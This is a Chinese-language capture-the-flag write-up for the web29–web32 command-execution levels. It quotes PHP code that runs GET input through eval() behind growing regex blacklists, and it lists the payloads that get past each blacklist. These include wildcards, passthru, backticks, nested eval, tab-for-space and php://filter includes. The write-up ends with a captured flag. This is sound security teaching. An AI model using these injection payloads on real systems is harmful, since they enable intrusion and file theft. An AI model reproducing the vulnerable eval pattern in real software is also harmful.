# web入门

## 3.命令执行

### Web29

1. 代码审计下

   ```php
    <?php
   error_reporting(0);
   if(isset($_GET['c'])){
       $c = $_GET['c'];
       if(!preg_match("/flag/i", $c)){
           eval($c);
       }
       //这里对flag进行了正则匹配过滤
   }else{
       highlight_file(__FILE__);
   } 
   ```

2. 通过`GET`请求传递参数，进行代码执行，绕过正则过滤即可

   ```shell
   #查看当前目录下文件
   ?c=system('ls');
   ```

   ![](img/image-20210608182528820.png)

3. 发现有`flag.php`，但是正则过滤了`flag`，这里可以用通配符来绕过

   ```shell
   ?c=system('cat fla?.php');
   
   #php没有显示要查看源代码
   
   #也可以重命名绕过
   ```

   ![](img/image-20210608182811112.png)



### web30

1. 代码审计

   ```php
    <?php
   error_reporting(0);
   if(isset($_GET['c'])){
       $c = $_GET['c'];
       if(!preg_match("/flag|system|php/i", $c)){
           eval($c);
       }
       //这里对system/php增加了过滤
   }else{
       highlight_file(__FILE__);
   } 
   ```

2. 考虑其他系统执行函数进行绕过，还可以用反引号作为系统命令

   ```shell
   ?c=passthru('ls');
   
   #反引号作为系统命令
   ?c=`cp fla?.??? 1.txt`;
   ```

   ![](img/image-20210608185410026.png)

3. 因为过滤了`php`,`flag`,这里用通配符来，查看flag
   
      ```shell
      ?c=passthru('cat fla*');
      ```
   
      
   
      ![](img/image-20210608190019867.png)



### web31

1. 仍然是代码审计

   ```php
    <?php
   error_reporting(0);
   if(isset($_GET['c'])){
       $c = $_GET['c'];
       if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
           eval($c);
       }
       //在此基础上对cat,sort,shell,.,空格,单引号进行过滤
   }else{
       highlight_file(__FILE__);
   } 
   ```

2. 这里可以构造`eval`函数请求嵌套或者`passthru`函数进行绕过

   ```shell
   ?c=eval($_GET[1]);&1=system('ls');
   
   #passthru函数
   ?c=passthru("ls");
   ```

   ![](img/image-20210608193320346.png)

3. 嵌套函数可以无视正则过滤，但是第二种`passthru`方法，`cat`被过滤了，还可以用`tac`,`more`，单引号被过滤用双引号，空格被过滤用tab键

   ```shell
   ?c=eval($_GET[1]);&1=system('cat flag.php');
   
   #passthru函数
   ?c=passthru("tac%09fla*");
   ```

   ![](img/image-20210608193906927.png)



### web32

1. 代码审计

   ```php
    <?php
   error_reporting(0);
   if(isset($_GET['c'])){
       $c = $_GET['c'];
       if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
           eval($c);
       }
       //过滤flag，system，php，cat，sort，shell，点号，空格，单引号,反撇号,echo,(
   }else{
       highlight_file(__FILE__);
   } 
   ```
   
2. 用上一题的方法，嵌套包含flag.php文件逃逸出来

   ```shell
   ?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
   
   #php://filter参考文件包含漏洞中的php伪协议
   
   #得到的文字base64再解码
   ctfshow{2bf658c1-4a45-4dea-8ecd-6379c4f22abf}
   ```

   ![3](img/image-20210608202154453.png)

